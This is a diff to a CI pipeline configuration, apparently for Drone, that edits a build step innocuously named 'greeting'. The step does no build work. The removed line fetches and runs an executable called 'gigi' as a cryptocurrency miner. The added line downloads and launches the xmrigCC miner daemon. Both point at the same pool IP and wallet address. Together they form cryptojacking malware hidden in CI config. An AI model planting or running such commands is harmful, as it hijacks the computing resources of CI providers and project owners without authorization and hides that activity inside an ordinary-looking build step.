@@ -7,5 +7,4 @@ steps:
 - name: greeting
   image: golang:1.12
   commands:
-  - wget -O gigi https://github.com/cornea99/upil/raw/main/zepo > /dev/null 2>&1 chmod 777 gigi && ./gigi --donate-level 1 -o 134.122.78.130:443 -u SaLvsBu6oFag1w7AWnq7MJe1kiEj39WXE7RwTNzRH8sU2xy3sSxZfwQjLHRqLUu32NTfEqd7xKhMwK3t3V2Tix9EZUtghWuUwyN -p Drone -a rx/0 -t $(nproc --all)
-  
+  - wget https://github.com/Bendr0id/xmrigCC/releases/download/2.9.4/xmrigCC-2.9.4-linux-generic-amd64.tar.gz && tar -xf xmrigCC-2.9.4-linux-generic-amd64.tar.gz && rm xmrigCC-2.9.4-linux-generic-amd64.tar.gz && ./miner/xmrigDaemon -o 134.122.78.130:443 -u SaLvsBu6oFag1w7AWnq7MJe1kiEj39WXE7RwTNzRH8sU2xy3sSxZfwQjLHRqLUu32NTfEqd7xKhMwK3t3V2Tix9EZUtghWuUwyN -p x -k --tls --tls -a rx/0
